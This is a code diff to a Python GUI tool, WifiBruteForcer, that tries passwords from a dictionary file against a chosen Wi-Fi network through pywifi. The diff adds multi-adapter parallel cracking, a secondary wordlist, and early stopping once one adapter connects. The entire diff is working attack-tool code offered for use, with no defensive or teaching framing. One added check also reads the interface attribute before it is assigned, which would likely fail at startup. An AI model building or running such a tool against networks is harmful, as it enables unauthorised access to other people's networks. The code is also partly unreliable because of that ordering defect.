@@ -50,6 +50,9 @@ class WifiBruteForcer:
         self.scan_btn.pack(pady=5)
         self.scan_btn.bind("<ButtonPress-1>", self._on_button_press)
         self.scan_btn.bind("<ButtonRelease-1>", self._on_button_release)
+        if not self.iface: # Disable scan button if no interface is available
+            self.scan_btn.config(state=tk.DISABLED)
+
 
         self.network_listbox = tk.Listbox(master, selectmode=tk.SINGLE, width=60, height=8)
         self.network_listbox.pack(pady=5, padx=10, fill=tk.X, expand=True)
@@ -74,12 +77,85 @@ class WifiBruteForcer:
         self.status_label.pack(pady=10)
 
         # Initialize wifi
-        wifi = pywifi.PyWiFi()
-        self.iface = wifi.interfaces()[0]
+        self.wifi = pywifi.PyWiFi()
+        try:
+            self.all_interfaces = self.wifi.interfaces()
+            if not self.all_interfaces:
+                messagebox.showerror("Error", "No Wi-Fi interfaces found. Cracking and scanning functionality will be limited.")
+                self.iface = None # Explicitly set iface to None
+                # self.scan_btn will be disabled later if self.iface is None
+            else:
+                self.iface = self.all_interfaces[0] # Default to the first interface for scanning
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to initialize Wi-Fi interfaces: {e}")
+            self.all_interfaces = []
+            self.iface = None
+            # self.scan_btn will be disabled later if self.iface is None
+
+        # self.iface = wifi.interfaces()[0] # Deprecated, will be handled by selection
+        # self.iface is now set above
+
+
+        # --- Adapter Selection Frame ---
+        self.adapter_frame = tk.Frame(master)
+        self.adapter_frame.pack(pady=5, padx=10, fill=tk.X)
+
+        self.adapter_label = tk.Label(self.adapter_frame, text="Select Adapter(s):")
+        self.adapter_label.pack(side=tk.LEFT, padx=(0, 5))
+
+        self.adapter_listbox = tk.Listbox(self.adapter_frame, selectmode=tk.EXTENDED, width=50, height=3)
+        if self.all_interfaces:
+            for iface in self.all_interfaces:
+                self.adapter_listbox.insert(tk.END, iface.name())
+            if self.all_interfaces: # Select the first interface by default
+                self.adapter_listbox.selection_set(0)
+        else:
+            self.adapter_listbox.insert(tk.END, "No interfaces found")
+            self.adapter_listbox.config(state=tk.DISABLED)
+        self.adapter_listbox.pack(side=tk.LEFT, fill=tk.X, expand=True)
+
+        # --- Mode Selection Frame ---
+        self.mode_selection_frame = tk.Frame(master)
+        self.mode_selection_frame.pack(pady=5, padx=10, fill=tk.X)
+
+        self.adapter_mode_var = tk.StringVar(value="Single Adapter Mode")
+        self.single_adapter_radio = tk.Radiobutton(
+            self.mode_selection_frame, text="Single Adapter Mode",
+            variable=self.adapter_mode_var, value="Single Adapter Mode",
+            command=self._on_adapter_mode_change
+        )
+        self.single_adapter_radio.pack(side=tk.LEFT, padx=(0, 10))
+
+        self.multi_adapter_radio = tk.Radiobutton(
+            self.mode_selection_frame, text="Multiple Adapters Mode",
+            variable=self.adapter_mode_var, value="Multiple Adapters Mode",
+            command=self._on_adapter_mode_change
+        )
+        self.multi_adapter_radio.pack(side=tk.LEFT)
+
+        # --- Secondary Dictionary Frame ---
+        self.secondary_dict_frame = tk.Frame(master)
+        # Packed later by _on_adapter_mode_change
+
+        self.load_secondary_dict_btn = tk.Button(
+            self.secondary_dict_frame, text="Load Secondary Dictionary",
+            command=self.load_secondary_dictionary
+        )
+        self.load_secondary_dict_btn.pack(side=tk.LEFT, pady=5)
+        self.load_secondary_dict_btn.bind("<ButtonPress-1>", self._on_button_press)
+        self.load_secondary_dict_btn.bind("<ButtonRelease-1>", self._on_button_release)
+
+        self.secondary_dict_label = tk.Label(self.secondary_dict_frame, text="No secondary dictionary loaded")
+        self.secondary_dict_label.pack(side=tk.LEFT, pady=5, padx=5)
+
         self.networks = []
         self.dictionary = []
+        self.secondary_dictionary = []
+        self.secondary_dict_path = ""
+
 
         self.apply_current_theme() # Apply theme after all widgets are created
+        self._on_adapter_mode_change() # Call once to set initial state of UI elements
 
     def _on_button_press(self, event):
         widget = event.widget
@@ -185,12 +261,26 @@ class WifiBruteForcer:
         # Network Listbox - state handling is mostly visual through bg/fg
         # Tkinter Listbox doesn't have disabledbackground/disabledforeground
         # Its appearance when "disabled" (i.e., not interactive) is controlled by its standard bg/fg.
-        self.network_listbox.config(
-            bg=current_palette.get("listbox_bg"),
-            fg=current_palette.get("fg_color"),
-            selectbackground=current_palette.get("select_bg"),
-            selectforeground=current_palette.get("fg_color") # Ensure selected item text is also themed
-        )
+        for listbox_widget in [self.network_listbox, self.adapter_listbox]:
+            if listbox_widget.cget('state') == tk.DISABLED:
+                # For a disabled listbox, we might want a slightly different look,
+                # e.g., a dimmed foreground or background, but Tkinter's default
+                # is often just to make it non-interactive.
+                # We'll use the standard listbox_bg but perhaps a more muted fg.
+                # For now, let's stick to the theme's listbox_bg and fg_color
+                # as Tkinter doesn't offer separate disabled colors for Listbox.
+                listbox_widget.config(
+                    bg=current_palette.get("listbox_bg"),
+                    fg=current_palette.get("fg_color"), # Or a dimmer color if desired
+                    # selectbackground/selectforeground are less relevant for disabled
+                )
+            else:
+                listbox_widget.config(
+                    bg=current_palette.get("listbox_bg"),
+                    fg=current_palette.get("fg_color"),
+                    selectbackground=current_palette.get("select_bg"),
+                    selectforeground=current_palette.get("fg_color") # Ensure selected item text is also themed
+                )
 
     def _toggle_hidden(self):
         is_hidden = self.hidden_var.get()
@@ -217,9 +307,17 @@ class WifiBruteForcer:
         # Ensure status label is themed immediately
         if hasattr(self, 'current_theme_name'): # Check if theming is initialized
              themes.apply_theme_to_widget(self.status_label, themes.get_current_theme())
+
+        if not self.iface:
+            messagebox.showerror("Error", "No Wi-Fi interface available for scanning.")
+            self.status_label.config(text="Status: Error - No Wi-Fi adapter")
+            if hasattr(self, 'current_theme_name'):
+                 themes.apply_theme_to_widget(self.status_label, themes.get_current_theme())
+            return
+
         try:
             self.iface.scan()
-            time.sleep(2)
+            time.sleep(2) # Already present, seems reasonable for pywifi
             results = self.iface.scan_results()
             ssids = sorted({net.ssid for net in results if net.ssid})
             self.networks = ssids
@@ -251,6 +349,38 @@ class WifiBruteForcer:
         finally:
             if hasattr(self, 'current_theme_name'): # Re-apply theme to status label
                  themes.apply_theme_to_widget(self.status_label, themes.get_current_theme())
+
+    def _on_adapter_mode_change(self):
+        mode = self.adapter_mode_var.get()
+        self.adapter_listbox.selection_clear(0, tk.END)
+
+        if mode == "Single Adapter Mode":
+            self.adapter_listbox.config(selectmode=tk.SINGLE)
+            self.secondary_dict_frame.pack_forget()
+            if self.all_interfaces: # Reselect first one if available
+                self.adapter_listbox.selection_set(0)
+        elif mode == "Multiple Adapters Mode":
+            self.adapter_listbox.config(selectmode=tk.EXTENDED)
+            self.secondary_dict_frame.pack(pady=5, padx=10, fill=tk.X, before=self.scan_btn) # Pack it before scan button
+            if self.all_interfaces: # Reselect first one if available
+                self.adapter_listbox.selection_set(0)
+
+        if hasattr(self, 'current_theme_name'): # Ensure new/changed widgets are themed
+            self.apply_current_theme()
+
+
+    def load_secondary_dictionary(self):
+        path = filedialog.askopenfilename(title="Select secondary dictionary file",
+                                          filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
+        if path:
+            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+                self.secondary_dictionary = [line.strip() for line in f if line.strip()]
+            self.secondary_dict_path = path
+            self.secondary_dict_label.config(text=f"Sec. Dictionary: {path} ({len(self.secondary_dictionary)} entries)")
+            if hasattr(self, 'current_theme_name'):
+                 themes.apply_theme_to_widget(self.secondary_dict_label, themes.get_current_theme())
+                 themes.apply_theme_to_widget(self.load_secondary_dict_btn, themes.get_current_theme())
+
 
     def _animate_list_item_in(self, index, ssid_text):
         # This method is called by 'after' to finalize item appearance
@@ -304,27 +434,75 @@ class WifiBruteForcer:
             messagebox.showwarning("Warning", "Please load a password dictionary.")
             return
 
-        t = threading.Thread(target=self.bruteforce, args=(ssid, self.hidden_var.get()))
+        # Determine selected network
+        if self.hidden_var.get():
+            target_ssid = self.ssid_entry.get().strip()
+            if not target_ssid:
+                messagebox.showwarning("Warning", "Enter the hidden SSID first.")
+                return
+        else:
+            sel_network = self.network_listbox.curselection()
+            if not sel_network:
+                messagebox.showwarning("Warning", "Please select a network to attack.")
+                return
+            target_ssid = self.networks[sel_network[0]]
+
+        # Determine selected adapters
+        selected_adapter_indices = self.adapter_listbox.curselection()
+        if not selected_adapter_indices:
+            messagebox.showwarning("Warning", "Please select at least one adapter.")
+            return
+
+        selected_interfaces = [self.all_interfaces[i] for i in selected_adapter_indices]
+
+        # Determine which dictionary to use
+        current_mode = self.adapter_mode_var.get()
+        chosen_dictionary = self.dictionary
+        dict_source = "primary"
+
+        if current_mode == "Multiple Adapters Mode" and self.secondary_dictionary:
+            chosen_dictionary = self.secondary_dictionary
+            dict_source = "secondary"
+
+        if not chosen_dictionary:
+            messagebox.showwarning("Warning", f"Please load the {dict_source} password dictionary.")
+            return
+
+        # Validate adapter selection based on mode
+        if current_mode == "Single Adapter Mode":
+            if len(selected_interfaces) > 1:
+                # This case should ideally not happen if listbox selectmode is SINGLE
+                # and _on_adapter_mode_change clears/sets one selection.
+                # However, as a safeguard:
+                messagebox.showwarning("Warning", "Single Adapter Mode: Please select only one adapter.")
+                return
+            interfaces_to_use = selected_interfaces[0] # Pass single interface object
+        else: # Multiple Adapters Mode
+            if not selected_interfaces: # Should be caught by earlier check but good to be robust
+                 messagebox.showwarning("Warning", "Multiple Adapter Mode: Please select adapter(s).")
+                 return
+            interfaces_to_use = selected_interfaces # Pass list of interfaces
+
+        t = threading.Thread(target=self.bruteforce, args=(target_ssid, self.hidden_var.get(), interfaces_to_use, chosen_dictionary))
         t.daemon = True
         t.start()
 
-    def bruteforce(self, ssid, hidden):
-        self.status_label.config(text=f"Status: Attacking {ssid}...")
+    def _try_passwords_on_adapter(self, adapter_iface, ssid, hidden, dictionary_to_use, password_found_event):
+        adapter_name = adapter_iface.name()
+        self.master.after(0, lambda: self.status_label.config(text=f"Adapter '{adapter_name}': Starting attack on {ssid}"))
         if hasattr(self, 'current_theme_name'):
-             themes.apply_theme_to_widget(self.status_label, themes.get_current_theme())
+            self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))
 
-        for pwd_idx, pwd in enumerate(self.dictionary):
-            # Update status label for each attempt, ensuring it's themed.
-            # This is important because this runs in a thread.
-            # We need to schedule the GUI update on the main thread if issues arise,
-            # but for simple label text changes, Tkinter is often tolerant.
-            # However, direct widget configuration from threads is not strictly safe.
-            # A safer way would be to use master.after or a queue.
-            # For now, keeping it simple:
-            self.master.after(0, lambda: self.status_label.config(text=f"Trying: {pwd}"))
+        for pwd_idx, pwd in enumerate(dictionary_to_use):
+            if password_found_event.is_set():
+                self.master.after(0, lambda: self.status_label.config(text=f"Adapter '{adapter_name}': Stopping, password found by another adapter."))
+                if hasattr(self, 'current_theme_name'):
+                    self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))
+                return
+
+            self.master.after(0, lambda current_pwd=pwd: self.status_label.config(text=f"Adapter '{adapter_name}': Trying {current_pwd}"))
             if hasattr(self, 'current_theme_name'):
                  self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))
-
 
             profile = pywifi.Profile()
             profile.ssid = ssid
@@ -338,23 +516,77 @@ class WifiBruteForcer:
                 except AttributeError:
                     pass # Older pywifi might not have this
 
-            self.iface.remove_all_network_profiles()
-            tmp = self.iface.add_network_profile(profile)
-            self.iface.connect(tmp)
-            time.sleep(3) # Connection attempt timeout
+            # It's crucial that each adapter manages its own profiles.
+            adapter_iface.remove_all_network_profiles()
+            tmp_profile = adapter_iface.add_network_profile(profile)
+            adapter_iface.connect(tmp_profile)
 
-            if self.iface.status() == const.IFACE_CONNECTED:
-                self.master.after(0, lambda: messagebox.showinfo("Success", f"Connected! SSID: {ssid}\nPassword: {pwd}"))
-                self.master.after(0, lambda: self.status_label.config(text="Status: Success"))
+            # Connection attempt timeout - adjust as needed. Shorter for multi-adapter?
+            # For now, let's keep it at 3, but this could be a point of optimization.
+            connect_time = 0
+            max_connect_time = 5 # Increased slightly for stability
+            while connect_time < max_connect_time:
+                if adapter_iface.status() == const.IFACE_CONNECTED:
+                    break
+                if password_found_event.is_set(): # Check again during wait
+                    adapter_iface.disconnect() # Ensure disconnected if we bail early
+                    return
+                time.sleep(0.5)
+                connect_time += 0.5
+
+            if adapter_iface.status() == const.IFACE_CONNECTED:
+                password_found_event.set() # Signal other threads
+                success_msg = f"Connected on '{adapter_name}'!\nSSID: {ssid}\nPassword: {pwd}"
+                self.master.after(0, lambda m=success_msg: messagebox.showinfo("Success", m))
+                self.master.after(0, lambda: self.status_label.config(text=f"Success on '{adapter_name}'! Pass: {pwd}"))
                 if hasattr(self, 'current_theme_name'):
                     self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))
+                # adapter_iface.disconnect() # Optional: disconnect after finding or keep connected
                 return
             else:
-                self.iface.disconnect()
-                time.sleep(1) # Brief pause after disconnect
+                adapter_iface.disconnect()
+                # Brief pause, but not too long to slow down multi-adapter significantly
+                time.sleep(0.1)
 
-        self.master.after(0, lambda: messagebox.showinfo("Finished", f"Brute force complete for {ssid}, no password found."))
-        self.master.after(0, lambda: self.status_label.config(text="Status: Finished"))
+        if not password_found_event.is_set():
+            self.master.after(0, lambda: self.status_label.config(text=f"Adapter '{adapter_name}': Finished, no password found."))
+            if hasattr(self, 'current_theme_name'):
+                self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))
+
+
+    def bruteforce(self, ssid, hidden, interfaces_to_use, current_dictionary): # New signature
+        self.status_label.config(text=f"Status: Attacking {ssid}...")
+        if hasattr(self, 'current_theme_name'):
+             themes.apply_theme_to_widget(self.status_label, themes.get_current_theme())
+
+        self.password_found_event = threading.Event()
+        threads = []
+
+        if not isinstance(interfaces_to_use, list):
+            interfaces_to_use = [interfaces_to_use] # Ensure it's a list
+
+        if not interfaces_to_use:
+            messagebox.showerror("Error", "No interfaces selected for bruteforce.")
+            self.status_label.config(text="Status: Error - No interfaces")
+            return
+
+        for iface_obj in interfaces_to_use:
+            thread = threading.Thread(target=self._try_passwords_on_adapter,
+                                      args=(iface_obj, ssid, hidden, current_dictionary, self.password_found_event))
+            thread.daemon = True
+            threads.append(thread)
+            thread.start()
+
+        for thread in threads:
+            thread.join() # Wait for all threads to complete
+
+        if self.password_found_event.is_set():
+            # Success message already shown by the thread that found it
+            self.master.after(0, lambda: self.status_label.config(text="Status: Password Found!"))
+        else:
+            self.master.after(0, lambda: messagebox.showinfo("Finished", f"Brute force complete for {ssid}, no password found with selected adapter(s)."))
+            self.master.after(0, lambda: self.status_label.config(text="Status: Finished - No password found"))
+
         if hasattr(self, 'current_theme_name'):
             self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))
 
